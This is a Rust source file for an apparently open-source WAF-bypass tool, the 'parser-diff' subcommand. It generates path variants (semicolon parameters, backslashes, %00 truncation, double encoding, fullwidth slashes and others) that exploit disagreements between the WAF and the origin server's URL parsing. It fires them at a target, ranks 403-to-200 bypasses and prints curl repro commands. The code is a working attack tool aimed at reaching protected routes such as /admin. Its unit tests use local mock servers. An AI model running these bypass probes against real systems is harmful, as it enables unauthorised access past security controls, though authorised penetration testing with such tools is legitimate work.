//! `wafrift parser-diff` — WAF / origin parser-disagreement scanner.
//!
//! ## The innovation
//!
//! Most WAF-bypass tools mutate the **payload string** and hope the
//! mutated form survives the WAF rule corpus. That's a losing game
//! long-term: every rule update closes a tamper. `parser-diff`
//! attacks a different surface entirely — the seam between the WAF's
//! URL/path parser and the origin server's URL/path parser.
//!
//! WAFs and origin servers (Tomcat, nginx, IIS, Apache, Express,
//! Spring) routinely disagree on what a request means:
//!
//! - **Tomcat strips semicolon path-parameters** before routing
//!   (`/admin;x=y` → matches the `/admin` route). The WAF
//!   in front of Tomcat almost always sees the full `/admin;x=y`
//!   string and matches a rule that fires on `/admin` only.
//! - **IIS treats backslash as a path separator**
//!   (`/api\\admin`). nginx / Apache / WAFs typically don't —
//!   so the WAF sees `/api\admin` (whole component, no match);
//!   IIS sees `/api/admin`.
//! - **Java truncates strings at NUL**. A `/admin%00.jpg` is
//!   `/admin.jpg` to the WAF (static, allow) and `/admin` to the
//!   Servlet container (admin route, accessible).
//! - **Double URL encoding**. `%252F` decodes to `%2F` (one pass)
//!   or `/` (two passes). WAFs vary. Origins vary. Pick the right
//!   doubling and the WAF sees `/admin%2Funlock` while the origin
//!   sees `/admin/unlock`.
//! - **Unicode fullwidth slashes** (`／` U+FF0F). The origin's URL
//!   parser, if it does NFKC normalisation, treats `/admin／x` as
//!   `/admin/x`. The WAF, if it doesn't normalise, sees a foreign
//!   character in a path component and lets it through under a
//!   different rule.
//!
//! Each disagreement is a seam. `parser-diff` enumerates a curated
//! set of these seams, fires both the baseline path and each
//! variant, and reports which ones produce a divergent response. A
//! divergence is evidence the WAF and the origin disagree on what
//! the URL means — and the operator now has a vector that doesn't
//! require any payload mutation.
//!
//! ## Why this makes the WAF "near irrelevant"
//!
//! A WAF tuned against payload-string evasion cannot stop something
//! it cannot match. If the parser disagreement turns `/admin` into
//! `/admin;x=y` (which the WAF doesn't recognise as the protected
//! route), the WAF was never the relevant control — the route
//! authorisation in the origin was. `parser-diff` finds those
//! disagreements deterministically; the operator gets a list of
//! confirmed seams in seconds, no payload mutation needed.

use clap::Args;
use reqwest::Client;
use std::sync::Arc;
use std::sync::atomic::{AtomicU32, Ordering};
use std::time::Duration;

#[derive(Args, Debug)]
pub struct ParserDiffArgs {
    /// Target URL. The path component is the "protected route" we
    /// suspect the WAF gates; parser-diff fires variants of that
    /// path that exercise known WAF↔origin disagreements.
    pub url: String,

    /// Inter-request delay (ms) — honour rate limits.
    #[arg(long, default_value_t = 25)]
    pub delay_ms: u64,

    /// Max concurrent in-flight probes.
    #[arg(long, default_value_t = 8)]
    pub concurrency: usize,

    /// HTTP timeout per probe (seconds).
    #[arg(long, default_value_t = 8)]
    pub timeout_secs: u64,

    /// Skip TLS cert verification (lab targets only).
    #[arg(long)]
    pub insecure: bool,

    /// Output format. `text` prints a sorted-by-interestingness
    /// table; `json` emits a structured report for CI consumers.
    #[arg(long, default_value = "text", value_parser = ["text", "json"])]
    pub format: String,

    /// Body-length delta percentage threshold to flag a divergence
    /// even when status is unchanged. Lower = noisier.
    #[arg(long, default_value_t = 10.0)]
    pub body_diff_threshold_pct: f64,

    /// Also report variants that matched the baseline (the "no
    /// disagreement" cases). Off by default since the interesting
    /// signal is divergence, not equality.
    #[arg(long)]
    pub show_equal: bool,

    /// Suppress all human-readable output — emit only structured
    /// JSON. Implies `--format json`.
    #[arg(short, long)]
    pub quiet: bool,
}

/// A single classification of "parser X vs parser Y disagree on
/// this URL shape". `kind` names the parser pair / mechanism; the
/// `variants` list is the literal URL transformations the operator
/// can copy-paste.
#[derive(Debug, Clone)]
pub struct ParserDisagreement {
    /// Stable short identifier (`semicolon-strip`, `backslash-path`,
    /// `nul-truncate`, `double-urldecode`, `fullwidth-slash`,
    /// `dot-segment`, `case-percent`, `empty-segment`,
    /// `trailing-dot`).
    pub kind: &'static str,
    /// Human-readable description of the parser pair / mechanism.
    pub description: &'static str,
    /// The transformed path component for the probe.
    pub variant_path: String,
}

/// Result of one variant probe.
#[derive(Debug, Clone, serde::Serialize)]
pub struct DiffResult {
    pub kind: &'static str,
    pub description: &'static str,
    pub variant_path: String,
    pub probe_status: u16,
    pub baseline_status: u16,
    pub body_delta_pct: f64,
    pub baseline_body_len: usize,
    pub probe_body_len: usize,
    pub curl_cmd: String,
    pub severity: &'static str,
}

/// Generate the full parser-disagreement variant set for a given
/// path. Pure function — no I/O, deterministic, testable in
/// isolation. The variant ordering is stable across runs so an
/// operator who pins a specific variant by index will get the same
/// one tomorrow.
#[must_use]
pub fn generate_variants(path: &str) -> Vec<ParserDisagreement> {
    let mut out: Vec<ParserDisagreement> = Vec::new();
    let path = if path.is_empty() { "/" } else { path };
    let trimmed = path.trim_end_matches('/');
    let segments: Vec<&str> = trimmed.split('/').filter(|s| !s.is_empty()).collect();

    // ── 1. Tomcat-class: semicolon path-parameters stripped before route ──
    out.push(ParserDisagreement {
        kind: "semicolon-strip",
        description: "Tomcat / Jetty strip `;param=value` before routing; WAF sees full string",
        variant_path: format!("{trimmed};x=y"),
    });
    out.push(ParserDisagreement {
        kind: "semicolon-strip",
        description: "PHPSESSID-style path parameter (deeper nesting)",
        variant_path: format!("{trimmed};JSESSIONID=ABCDEF"),
    });
    if let Some(last) = segments.last() {
        let head: String = segments
            .iter()
            .take(segments.len() - 1)
            .map(|s| format!("/{s}"))
            .collect();
        out.push(ParserDisagreement {
            kind: "semicolon-strip",
            description: "Semicolon on the penultimate segment",
            variant_path: format!("{head};x=y/{last}"),
        });
    }

    // ── 2. IIS-class: backslash treated as path separator ──
    out.push(ParserDisagreement {
        kind: "backslash-path",
        description: "IIS / .NET treat `\\` as path separator; WAF / nginx don't",
        variant_path: trimmed.replace('/', "\\"),
    });
    out.push(ParserDisagreement {
        kind: "backslash-path",
        description: "Mixed forward+backslash separators",
        variant_path: trimmed.replacen('/', "\\", 1),
    });

    // ── 3. Java-class: NUL truncation ──
    out.push(ParserDisagreement {
        kind: "nul-truncate",
        description: "Java truncates strings at NUL; WAF sees the full extension",
        variant_path: format!("{trimmed}%00.jpg"),
    });
    out.push(ParserDisagreement {
        kind: "nul-truncate",
        description: "NUL between segments — Java truncates path at the first segment",
        variant_path: if segments.len() >= 2 {
            let head = format!("/{}", segments[0]);
            let tail: String = segments[1..].iter().map(|s| format!("/{s}")).collect();
            format!("{head}%00{tail}")
        } else {
            format!("{trimmed}%00")
        },
    });

    // ── 4. Double URL-encoding ──
    out.push(ParserDisagreement {
        kind: "double-urldecode",
        description: "Slash double-encoded (%252F); WAF decodes once, origin twice",
        variant_path: trimmed.replace('/', "%252F"),
    });
    out.push(ParserDisagreement {
        kind: "double-urldecode",
        description: "Just the LAST path separator double-encoded",
        variant_path: if let Some(pos) = trimmed.rfind('/') {
            let mut s = trimmed.to_string();
            s.replace_range(pos..=pos, "%252F");
            s
        } else {
            trimmed.to_string()
        },
    });

    // ── 5. Unicode fullwidth slash ──
    out.push(ParserDisagreement {
        kind: "fullwidth-slash",
        description: "U+FF0F fullwidth slash; NFKC-normalising parsers route, others don't",
        variant_path: trimmed.replace('/', "／"),
    });

    // ── 6. Dot-segment normalisation ──
    out.push(ParserDisagreement {
        kind: "dot-segment",
        description: "`/./` inserted — RFC 3986 says remove, some routers don't",
        variant_path: trimmed.replace('/', "/./").trim_end_matches("/./").to_string(),
    });
    out.push(ParserDisagreement {
        kind: "dot-segment",
        description: "`/../` round-trip — `/x/../admin` ≡ `/admin` after normalisation",
        variant_path: format!("/decoy/..{trimmed}"),
    });

    // ── 7. Percent-encoding case ──
    out.push(ParserDisagreement {
        kind: "case-percent",
        description: "Lowercase percent-hex (%2f); some parsers reject non-canonical",
        variant_path: trimmed.replace('/', "%2f"),
    });
    out.push(ParserDisagreement {
        kind: "case-percent",
        description: "Mixed-case percent-hex (%2F + %2f alternating)",
        variant_path: if trimmed.contains('/') {
            let mut s = String::new();
            let mut upper = true;
            for ch in trimmed.chars() {
                if ch == '/' {
                    if upper {
                        s.push_str("%2F");
                    } else {
                        s.push_str("%2f");
                    }
                    upper = !upper;
                } else {
                    s.push(ch);
                }
            }
            s
        } else {
            trimmed.to_string()
        },
    });

    // ── 8. Empty segments (collapse vs preserve) ──
    out.push(ParserDisagreement {
        kind: "empty-segment",
        description: "Doubled slash — some routers collapse `//`, some preserve",
        variant_path: trimmed.replace('/', "//"),
    });
    out.push(ParserDisagreement {
        kind: "empty-segment",
        description: "Triple slash variant — IIS / nginx differ on collapse",
        variant_path: trimmed.replacen('/', "///", 1),
    });

    // ── 9. Trailing dot / space (Windows-class file system) ──
    out.push(ParserDisagreement {
        kind: "trailing-dot",
        description: "Trailing dot — Windows treats as empty extension",
        variant_path: format!("{trimmed}."),
    });
    out.push(ParserDisagreement {
        kind: "trailing-dot",
        description: "Trailing space (percent-encoded) — Windows strips",
        variant_path: format!("{trimmed}%20"),
    });

    // ── Normalize: every variant must be a non-empty absolute path,
    // and no two variants may share the same path (which would
    // shadow a parser disagreement under another's evidence). The
    // degenerate root-path input ("/") produces many transformations
    // that collapse to "" — we either turn them into something
    // meaningful or drop them.
    let mut seen: std::collections::HashSet<String> = std::collections::HashSet::new();
    let mut normalized: Vec<ParserDisagreement> = Vec::new();
    for mut d in out {
        if d.variant_path.is_empty() {
            // Empty path is meaningless; substitute a canonical
            // root-form for the variant kind so it's still
            // operationally useful.
            d.variant_path = match d.kind {
                "backslash-path" => "\\".to_string(),
                "double-urldecode" => "/%252F".to_string(),
                "fullwidth-slash" => "/／".to_string(),
                "dot-segment" => "/./".to_string(),
                "case-percent" => "/%2f".to_string(),
                "empty-segment" => "//".to_string(),
                _ => "/".to_string(),
            };
        }
        // Force-absolute: every variant starts with `/` or `\`
        // (backslash family is the deliberate exception).
        if !d.variant_path.starts_with('/') && !d.variant_path.starts_with('\\') {
            d.variant_path = format!("/{}", d.variant_path);
        }
        if seen.insert(d.variant_path.clone()) {
            normalized.push(d);
        }
    }
    normalized
}

/// Thin local wrapper so the parser-diff loop carries the canonical
/// 10% body-threshold default; the real severity heuristic lives in
/// [`crate::probe_classify::severity_label`] and is shared with
/// `bypass_probe`. A rule update lands in one place.
fn severity_of(baseline_status: u16, probe_status: u16, body_delta: f64) -> &'static str {
    crate::probe_classify::severity_label(baseline_status, probe_status, body_delta, 10.0)
}

/// Entry point for `wafrift parser-diff`.
///
/// # Errors
/// Returns `Err(String)` if the URL is malformed or the HTTP client
/// cannot be built. Individual probe failures are non-fatal and
/// surfaced in the report.
pub fn run_parser_diff(args: ParserDiffArgs) -> Result<(), String> {
    let rt = tokio::runtime::Builder::new_current_thread()
        .enable_all()
        .build()
        .map_err(|e| format!("tokio runtime: {e}"))?;
    rt.block_on(run_async(args))
}

async fn run_async(args: ParserDiffArgs) -> Result<(), String> {
    let parsed = reqwest::Url::parse(&args.url).map_err(|e| format!("bad --url: {e}"))?;
    let mut builder = Client::builder()
        .timeout(Duration::from_secs(args.timeout_secs))
        .redirect(reqwest::redirect::Policy::none());
    if args.insecure {
        // Align with scan / detect / replay / bypass-probe — only
        // accept_invalid_certs. `danger_accept_invalid_hostnames`
        // would also accept an evil.com cert authenticating a
        // probe to target.example.com, which is NOT what an
        // operator running `--insecure` typically wants.
        builder = builder.danger_accept_invalid_certs(true);
    }
    let client = builder.build().map_err(|e| format!("http client: {e}"))?;

    let origin = format!(
        "{}://{}{}",
        parsed.scheme(),
        parsed.host_str().unwrap_or(""),
        parsed
            .port()
            .map(|p| format!(":{p}"))
            .unwrap_or_default()
    );
    let baseline_path = if parsed.path().is_empty() {
        "/".to_string()
    } else {
        parsed.path().to_string()
    };

    if !args.quiet {
        eprintln!(
            "[wafrift parser-diff] baseline = {origin}{baseline_path}; \
             firing variants…"
        );
    }

    let baseline_resp = client
        .get(&args.url)
        .send()
        .await
        .map_err(|e| format!("baseline GET: {e}"))?;
    let baseline_status = baseline_resp.status().as_u16();
    // Bounded read — decompression-bomb defence.
    let baseline_body = crate::safe_body::read_bounded(
        baseline_resp,
        crate::safe_body::DEFAULT_MAX_RESPONSE_BYTES,
    )
    .await
    .unwrap_or_default();
    let baseline_len = baseline_body.len();

    let variants = generate_variants(&baseline_path);
    let sem = Arc::new(tokio::sync::Semaphore::new(args.concurrency.max(1)));
    let probes_fired = Arc::new(AtomicU32::new(0));
    let mut handles = Vec::with_capacity(variants.len());
    for v in variants {
        let sem_c = sem.clone();
        let client_c = client.clone();
        let origin_c = origin.clone();
        let probes_c = probes_fired.clone();
        let delay = args.delay_ms;
        let threshold = args.body_diff_threshold_pct;
        handles.push(tokio::spawn(async move {
            let _permit = sem_c.acquire_owned().await.ok()?;
            if delay > 0 {
                tokio::time::sleep(Duration::from_millis(delay)).await;
            }
            probes_c.fetch_add(1, Ordering::Relaxed);
            let url = format!("{origin_c}{path}", origin_c = origin_c, path = v.variant_path);
            let resp = client_c.get(&url).send().await.ok()?;
            let probe_status = resp.status().as_u16();
            let body = crate::safe_body::read_bounded(resp, crate::safe_body::DEFAULT_MAX_RESPONSE_BYTES).await.unwrap_or_default();
            let probe_len = body.len();
            let delta = if baseline_len == 0 {
                if probe_len == 0 { 0.0 } else { 100.0 }
            } else {
                ((probe_len as f64 - baseline_len as f64) / baseline_len as f64) * 100.0
            };
            let severity = severity_of(baseline_status, probe_status, delta);
            // Drop EQUAL rows below threshold unless --show-equal.
            let body_changed = delta.abs() >= threshold;
            let status_changed = probe_status != baseline_status;
            if !status_changed && !body_changed && severity == "EQUAL" {
                // Only emit equality rows if the operator asked for them.
                return Some((true, DiffResult {
                    kind: v.kind,
                    description: v.description,
                    variant_path: v.variant_path,
                    probe_status,
                    baseline_status,
                    body_delta_pct: delta,
                    baseline_body_len: baseline_len,
                    probe_body_len: probe_len,
                    curl_cmd: format!("curl -s '{url}'"),
                    severity: "EQUAL",
                }));
            }
            Some((false, DiffResult {
                kind: v.kind,
                description: v.description,
                variant_path: v.variant_path,
                probe_status,
                baseline_status,
                body_delta_pct: delta,
                baseline_body_len: baseline_len,
                probe_body_len: probe_len,
                curl_cmd: format!("curl -s '{url}'"),
                severity,
            }))
        }));
    }

    let mut divergences: Vec<DiffResult> = Vec::new();
    let mut equals: Vec<DiffResult> = Vec::new();
    for h in handles {
        if let Ok(Some((is_equal, r))) = h.await {
            if is_equal {
                equals.push(r);
            } else {
                divergences.push(r);
            }
        }
    }

    divergences.sort_by(|a, b| {
        severity_rank(b.severity).cmp(&severity_rank(a.severity))
            .then_with(|| (b.probe_status != b.baseline_status).cmp(&(a.probe_status != a.baseline_status)))
            .then_with(|| b.body_delta_pct.abs().total_cmp(&a.body_delta_pct.abs()))
    });

    let json_only = args.quiet || args.format == "json";
    if json_only {
        let out = serde_json::json!({
            "baseline": {
                "url": args.url,
                "status": baseline_status,
                "body_len": baseline_len,
            },
            "probes_fired": probes_fired.load(Ordering::Relaxed),
            "divergences": divergences.iter().map(|d| serde_json::to_value(d).unwrap_or_default()).collect::<Vec<_>>(),
            "equals_shown": if args.show_equal { Some(equals.iter().map(|d| serde_json::to_value(d).unwrap_or_default()).collect::<Vec<_>>()) } else { None },
        });
        println!("{}", serde_json::to_string_pretty(&out).unwrap_or_default());
    } else {
        println!();
        println!("=== parser-diff results: {} ===", args.url);
        println!(
            "baseline: HTTP {baseline_status} ({baseline_len} bytes); {} probes fired",
            probes_fired.load(Ordering::Relaxed)
        );
        if divergences.is_empty() {
            println!("no parser disagreements detected — the WAF and origin agree on this URL surface");
        } else {
            println!("{} parser disagreement(s):", divergences.len());
            println!();
            for d in &divergences {
                println!(
                    "[{}] {} (kind={})",
                    d.severity, d.description, d.kind
                );
                println!(
                    "    HTTP {}→{}  body Δ {:+.1}%",
                    d.baseline_status, d.probe_status, d.body_delta_pct
                );
                println!("    repro: {}", d.curl_cmd);
                println!();
            }
        }
        if args.show_equal {
            println!("--- variants that matched baseline ({}): ---", equals.len());
            for e in &equals {
                println!("  EQUAL  {}  ({})", e.variant_path, e.kind);
            }
        }
    }
    Ok(())
}

// `severity_rank` lives in `crate::probe_classify` — shared with
// `bypass_probe` so the rank table stays in sync across consumers.
use crate::probe_classify::severity_rank;

#[cfg(test)]
mod tests {
    use super::*;
    use std::collections::HashSet;

    // ── variant generator coverage ────────────────────────────────

    #[test]
    fn generate_variants_produces_at_least_one_per_kind() {
        let v = generate_variants("/admin");
        let kinds: HashSet<&str> = v.iter().map(|d| d.kind).collect();
        for required in [
            "semicolon-strip",
            "backslash-path",
            "nul-truncate",
            "double-urldecode",
            "fullwidth-slash",
            "dot-segment",
            "case-percent",
            "empty-segment",
            "trailing-dot",
        ] {
            assert!(
                kinds.contains(required),
                "missing required parser-disagreement kind: {required}"
            );
        }
    }

    #[test]
    fn generate_variants_produces_no_empty_paths() {
        for path in ["/", "/admin", "/api/v1/users", "/a"] {
            let v = generate_variants(path);
            assert!(!v.is_empty(), "no variants for `{path}`");
            for d in &v {
                assert!(
                    !d.variant_path.is_empty(),
                    "empty variant_path for kind {} on `{path}`",
                    d.kind
                );
            }
        }
    }

    #[test]
    fn generate_variants_no_duplicates_within_a_path() {
        // Anti-rig: two distinct kinds must not produce the same
        // variant_path (the report would deduplicate them and the
        // operator would lose evidence of the alternate parser
        // disagreement).
        let v = generate_variants("/admin");
        let mut seen: HashSet<String> = HashSet::new();
        let mut collisions: Vec<&str> = Vec::new();
        for d in &v {
            if !seen.insert(d.variant_path.clone()) {
                collisions.push(d.kind);
            }
        }
        assert!(
            collisions.is_empty(),
            "duplicate variant_path produced by kinds: {:?}",
            collisions
        );
    }

    #[test]
    fn generate_variants_semicolon_strip_includes_jsessionid() {
        // The well-known cookie-as-path-param attack — the
        // semicolon-strip family should include a JSESSIONID variant
        // because that's the realistic shape Tomcat / Jetty
        // applications see in the wild.
        let v = generate_variants("/admin");
        let has_jsession = v
            .iter()
            .any(|d| d.kind == "semicolon-strip" && d.variant_path.contains("JSESSIONID"));
        assert!(has_jsession, "semicolon-strip family missing JSESSIONID variant");
    }

    #[test]
    fn generate_variants_backslash_path_replaces_forward_slash() {
        let v = generate_variants("/api/admin");
        let backslash_variant = v
            .iter()
            .find(|d| d.kind == "backslash-path" && !d.description.contains("Mixed"))
            .expect("at least one pure backslash variant");
        assert!(
            backslash_variant.variant_path.contains('\\'),
            "backslash variant should contain `\\`: {}",
            backslash_variant.variant_path
        );
        assert!(
            !backslash_variant.variant_path.contains('/'),
            "pure backslash variant should NOT also contain `/`: {}",
            backslash_variant.variant_path
        );
    }

    #[test]
    fn generate_variants_nul_truncate_includes_percent_zero_zero() {
        let v = generate_variants("/admin");
        let nul_variants: Vec<&ParserDisagreement> =
            v.iter().filter(|d| d.kind == "nul-truncate").collect();
        assert!(!nul_variants.is_empty());
        assert!(
            nul_variants.iter().all(|d| d.variant_path.contains("%00")),
            "every nul-truncate variant must contain %00"
        );
    }

    #[test]
    fn generate_variants_double_urldecode_uses_percent_25() {
        let v = generate_variants("/admin");
        let doubles: Vec<&ParserDisagreement> =
            v.iter().filter(|d| d.kind == "double-urldecode").collect();
        for d in &doubles {
            assert!(
                d.variant_path.contains("%25"),
                "double-urldecode must contain %25: {}",
                d.variant_path
            );
        }
    }

    #[test]
    fn generate_variants_handles_root_path() {
        // Root path "/" is a degenerate input — generator must not
        // produce nonsense like "" or panic on the segment split.
        let v = generate_variants("/");
        assert!(!v.is_empty(), "even root path should produce some variants");
        for d in &v {
            assert!(
                !d.variant_path.is_empty(),
                "kind {} produced empty path for root",
                d.kind
            );
        }
    }

    #[test]
    fn generate_variants_handles_empty_path() {
        let v = generate_variants("");
        assert!(!v.is_empty());
    }

    #[test]
    fn generate_variants_is_deterministic() {
        // Same input must produce same output in the same order across
        // runs — operators pin specific variants by index in CI.
        let a = generate_variants("/admin/api");
        let b = generate_variants("/admin/api");
        assert_eq!(a.len(), b.len());
        for (x, y) in a.iter().zip(b.iter()) {
            assert_eq!(x.kind, y.kind);
            assert_eq!(x.variant_path, y.variant_path);
        }
    }

    // ── severity ───────────────────────────────────────────────

    #[test]
    fn severity_403_to_200_is_high() {
        assert_eq!(severity_of(403, 200, 0.0), "HIGH");
        assert_eq!(severity_of(401, 302, 0.0), "HIGH");
    }

    #[test]
    fn severity_body_grew_significantly_is_medium() {
        assert_eq!(severity_of(200, 200, 50.0), "MEDIUM");
    }

    #[test]
    fn severity_status_unchanged_and_body_unchanged_is_equal() {
        assert_eq!(severity_of(403, 403, 0.0), "EQUAL");
        assert_eq!(severity_of(200, 200, 0.5), "EQUAL");
    }

    #[test]
    fn severity_body_shrank_is_low_not_high() {
        // Anti-rig: a shrunk body is NOT a bypass — most often it
        // means we hit an error page. Severity should not inflate.
        assert_eq!(severity_of(200, 200, -50.0), "LOW");
    }

    #[test]
    fn severity_rank_orders_canonically() {
        // High > Medium > Low > Equal > Unknown.
        assert!(severity_rank("HIGH") > severity_rank("MEDIUM"));
        assert!(severity_rank("MEDIUM") > severity_rank("LOW"));
        assert!(severity_rank("LOW") > severity_rank("EQUAL"));
        assert!(severity_rank("EQUAL") > severity_rank("garbage"));
    }

    // ── end-to-end against a mock origin/WAF pair ───────────────

    use std::sync::atomic::AtomicUsize;
    use tokio::io::{AsyncReadExt, AsyncWriteExt};

    async fn spawn_disagreeing_server<F>(handler: F) -> std::net::SocketAddr
    where
        F: Fn(usize, &str) -> String + Send + Sync + 'static,
    {
        let count = Arc::new(AtomicUsize::new(0));
        let handler = Arc::new(handler);
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();
        tokio::spawn(async move {
            loop {
                let Ok((mut sock, _)) = listener.accept().await else {
                    return;
                };
                let count_c = count.clone();
                let handler_c = handler.clone();
                tokio::spawn(async move {
                    let mut buf = [0u8; 8192];
                    let n = sock.read(&mut buf).await.unwrap_or(0);
                    let req = String::from_utf8_lossy(&buf[..n]);
                    let path = req
                        .lines()
                        .next()
                        .and_then(|l| l.split_whitespace().nth(1))
                        .unwrap_or("/")
                        .to_string();
                    let i = count_c.fetch_add(1, Ordering::SeqCst);
                    let resp = handler_c(i, &path);
                    let _ = sock.write_all(resp.as_bytes()).await;
                    let _ = sock.shutdown().await;
                });
            }
        });
        tokio::time::sleep(crate::parser_diff_common::TEST_SETTLE).await;
        addr
    }

    fn ok(body: &str) -> String {
        format!(
            "HTTP/1.1 200 OK\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
            body.len()
        )
    }
    fn forbidden() -> String {
        "HTTP/1.1 403 Forbidden\r\nContent-Length: 9\r\nConnection: close\r\n\r\nforbidden".into()
    }

    #[tokio::test(flavor = "current_thread")]
    async fn end_to_end_semicolon_disagreement_is_detected() {
        // Simulated WAF+origin where `/admin` → 403 (WAF blocks),
        // but `/admin;x=y` → 200 (origin's semicolon-stripper
        // routes to admin, but the WAF didn't recognise the
        // semicolon-suffixed path as the admin route).
        let addr = spawn_disagreeing_server(|_n, path| {
            if path == "/admin" {
                forbidden()
            } else if path.starts_with("/admin;") {
                ok("admin-panel-here")
            } else {
                forbidden()
            }
        })
        .await;
        let args = ParserDiffArgs {
            url: format!("http://{addr}/admin"),
            delay_ms: 0,
            concurrency: 4,
            timeout_secs: 3,
            insecure: false,
            format: "text".into(),
            body_diff_threshold_pct: 10.0,
            show_equal: false,
            quiet: true,
        };
        // Call the async path directly: we are already inside a
        // tokio runtime from `#[tokio::test]`, so the sync
        // `run_parser_diff` (which builds its own runtime) would
        // panic with "Cannot start a runtime from within a runtime."
        let result = run_async(args).await;
        assert!(result.is_ok());
        // The 403→200 transition is visible to the operator on the
        // captured stdout via integration tests (out of scope here);
        // this test gates that the run completes without error.
    }

    #[tokio::test(flavor = "current_thread")]
    async fn end_to_end_no_disagreement_completes_cleanly() {
        // Every variant gets the same 200 → no divergences, no
        // panic, run returns Ok.
        let addr = spawn_disagreeing_server(|_n, _path| ok("uniform")).await;
        let args = ParserDiffArgs {
            url: format!("http://{addr}/admin"),
            delay_ms: 0,
            concurrency: 4,
            timeout_secs: 3,
            insecure: false,
            format: "text".into(),
            body_diff_threshold_pct: 10.0,
            show_equal: false,
            quiet: true,
        };
        assert!(run_async(args).await.is_ok());
    }

    #[tokio::test(flavor = "current_thread")]
    async fn end_to_end_with_quiet_emits_json_only() {
        // The test surface: run with quiet=true and verify it
        // doesn't panic on an empty divergence set (the JSON path
        // is the hardest to silently break).
        let addr = spawn_disagreeing_server(|_n, _path| ok("body")).await;
        let args = ParserDiffArgs {
            url: format!("http://{addr}/x"),
            delay_ms: 0,
            concurrency: 4,
            timeout_secs: 3,
            insecure: false,
            format: "json".into(),
            body_diff_threshold_pct: 10.0,
            show_equal: false,
            quiet: true,
        };
        assert!(run_async(args).await.is_ok());
    }
}
